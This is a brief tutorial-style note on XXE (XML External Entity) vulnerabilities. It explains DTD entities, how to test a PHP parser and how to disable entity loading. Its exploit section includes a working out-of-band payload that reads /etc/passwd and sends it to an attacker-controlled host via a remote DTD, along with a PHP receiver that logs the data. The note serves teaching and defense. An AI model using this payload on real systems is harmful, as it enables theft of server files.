# XXE
*  [Entity](#entity)   
*  [Exploit](#exploit)   
*  [Defense](#defense)  
*  [Reference](#reference)   
   
XML is a markdown language just like html, but it focuses on transmitting data, and Case-sensitive。  
```xml
<?xml version=“1.0” encoding=“utf-8”>    // xml declaration
<!DOCTYPE a[                    // DTD doc type def
    <!ENTITY .....>
]>
<a>     // doc element
....
</a>
```
In the `XXE-SSRF` part are the practice of clear and blind-based 

## Entity
In DTD, we all need to declare before use entity  
Entity is just like a variable  
1. Internal entity： `<!ENTITY name "value">`  
```xml
<!DOCTYPE pwnch[
  <!ENTITY var "hi">
]>
<root>&var;</root>
```  

2. External entity： `<!ENTITY name SYSTEM "URL">`  
```xml
<!ENTITY var SYSTEM "url://.......txt">
<root>&var;</root>
```
version after 2.9.0 default not to parse the external entity  
Therefore, we can use the code `print "libxml version: ".LIBXML_DOTTED_VERSION."\n";` to make sure  

3. Parameter entity： `<!ENTITY %name "value>"`  
`%` means reference of parameter entity in dtd.  
`&` means reference in xml doc.  

## Exploit
1. Vul to XXE?  
Input a xml to see whether it is parsed  
2. Support of External entity?  
3. Return -> Simple  
**php and XXE**  
```php
$xml = @new SimpleXMLElement($data);
echo $xml->node;
```
`SimpleXMLElement` would make content format like a list： `[node] => 'content'`  
The code at the last line `$xml->node` means take out the **node**  
Therefore, we need an exploit like `<node>&var;</node>`   

4. No Return -> OOB(Out-Of-Band) XXE  
Make server deliver the data to us  
```xml
// XML for server side
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://domain/xxe.dtd">
%remote;
%all;
%send;
]>
```
xxe.dtd  
```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://domain/test.php?a=%file;'>">
```
test.php  
```php
file_put_contents("test.txt",$_GET['a']);
```

## Defense
```php
// php 
libxml_disable_entity_loader(true);
// python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```  
[更詳細的內容可以參考這篇的漏洞修復與防禦](https://thief.one/2017/06/20/1/)

## Reference
* [浅谈XXE漏洞攻击与防御](https://thief.one/2017/06/20/1/)
